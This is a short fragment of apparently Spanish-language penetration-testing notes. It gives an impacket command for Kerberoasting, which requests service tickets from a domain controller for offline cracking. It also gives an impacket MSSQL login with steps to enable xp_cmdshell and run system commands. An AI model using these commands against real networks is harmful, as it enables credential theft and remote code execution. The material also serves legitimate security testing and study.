...
```bash
impacket-GetUserSPNs -request -outputfile kerberostables.txt -dc-ip <IP_DC> <DOMINIO>/<USUARIO>:<CONTRASEÑA>
```
...
```bash
impacket-mssqlclient <USER>:"<PASSWORD>"@<MSSQL_HOST_IP> -windows-auth

# 1. enable_xp_cmdshell
# 2. xp_cmdshell <command>
```
